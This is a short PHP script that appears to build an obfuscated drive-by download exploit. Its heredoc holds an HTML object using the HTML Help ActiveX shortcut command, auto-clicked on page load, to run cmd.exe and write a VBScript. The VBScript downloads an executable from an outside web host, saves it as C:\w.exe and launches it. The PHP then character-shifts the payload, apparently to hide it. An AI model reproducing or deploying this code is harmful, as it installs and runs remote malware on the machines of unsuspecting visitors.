<?
$a = <<<DOC
object id=a classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11>
<param name=command value=shortcut>
<param name=item1 value=',cmd.exe,/c start /min cmd.exe /c "echo on error resume next : set o = CreateObject("msxm"+"l2.X"+"MLH"+"TTP") : o.open "G"+"ET","http://janbradley.com/scripts/sgallery/test.exe",False : o.send : set s = createobject("adod"+"b.str"+"eam") : s.type=1 : s.open : s.write o.responseBody : s.savetofile "C:"+"\"+"w.e"+"xe",2 > c:\c.vbs&&wscript c:\c.vbs&&del c:\c.vbs&&if exist c:\w.exe start c:\w.exe"'>
</object>

<script>
a.Click()
</script>
DOC;
echo strlen($a)."<br>";
for ($i=0;$i<strlen($a);$i++) {
	$o = chr(ord($a[$i])-3);
	if ($o == "\r") $o = '\r';
	if ($o == "\n") $o = '\n';
	echo $o;
}
?>